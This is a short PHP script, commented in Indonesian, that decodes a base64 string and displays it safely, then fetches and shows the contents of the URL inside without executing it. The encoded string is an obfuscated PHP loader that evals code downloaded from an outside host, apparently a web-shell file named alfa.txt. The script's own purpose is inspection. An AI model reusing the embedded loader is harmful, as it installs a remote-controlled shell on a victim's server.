<?php
// String base64 yang kamu kasih
$base64 = "PD9waHAgZXZhbCgNCiAgICAvKipfKiovIHVybGRlY29kZSgiJTNmJTNlIikgLg0KICAgICAgICBmaWxlX2dldF9jb250ZW50cygNCiAgICAgICAgICAgIC8qKl8qKi8gdXJsZGVjb2RlKA0KICAgICAgICAgICAgICAgIC8qKl8qKi8gImh0dHBzOi8vd3d3LnRhcGZ1c2UuaW8vcmF3L2FsZmEudHh0Ig0KICAgICAgICAgICAgKQ0KICAgICAgICApDQopOyA/Pg==";

// Decode base64 jadi teks
$decoded = base64_decode($base64);

// Tampilkan hasil decode
echo "<h3>Hasil Decode:</h3>";
echo "<pre>" . htmlspecialchars($decoded) . "</pre>";

// Kalau mau ambil konten dari URL di dalam script (tanpa eval):
if (preg_match('/https?:\/\/[^\s"]+/', $decoded, $match)) {
    $url = $match[0];
    echo "<h3>Konten dari URL ($url):</h3>";
    echo "<pre>" . htmlspecialchars(file_get_contents($url)) . "</pre>";
}
?>
